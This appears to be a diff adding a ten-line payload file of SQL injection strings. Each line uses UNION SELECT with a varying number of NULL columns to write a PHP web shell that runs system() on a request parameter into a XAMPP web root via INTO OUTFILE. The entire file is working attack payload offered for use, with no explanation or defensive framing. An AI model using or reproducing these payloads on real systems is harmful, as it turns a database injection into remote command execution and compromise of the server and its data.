@@ -1,0 +1,10 @@
+UNION SELECT "<?php system($_GET['x']); ?>" INTO OUTFILE 'C:/xampp/htdocs/test.php'-- -
+UNION SELECT NULL,"<?php system($_GET['x']); ?>" INTO OUTFILE 'C:/xampp/htdocs/test.php'-- -
+UNION SELECT NULL,NULL,"<?php system($_GET['x']); ?>" INTO OUTFILE 'C:/xampp/htdocs/test.php'-- -
+UNION SELECT NULL,NULL,NULL,"<?php system($_GET['x']); ?>" INTO OUTFILE 'C:/xampp/htdocs/test.php'-- -
+UNION SELECT NULL,NULL,NULL,NULL,"<?php system($_GET['x']); ?>" INTO OUTFILE 'C:/xampp/htdocs/test.php'-- -
+UNION SELECT NULL,NULL,NULL,NULL,NULL,"<?php system($_GET['x']); ?>" INTO OUTFILE 'C:/xampp/htdocs/test.php'-- -
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,"<?php system($_GET['x']); ?>" INTO OUTFILE 'C:/xampp/htdocs/test.php'-- -
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,"<?php system($_GET['x']); ?>" INTO OUTFILE 'C:/xampp/htdocs/test.php'-- -
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,"<?php system($_GET['x']); ?>" INTO OUTFILE 'C:/xampp/htdocs/test.php'-- -
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,"<?php system($_GET['x']); ?>" INTO OUTFILE 'C:/xampp/htdocs/test.php'-- -
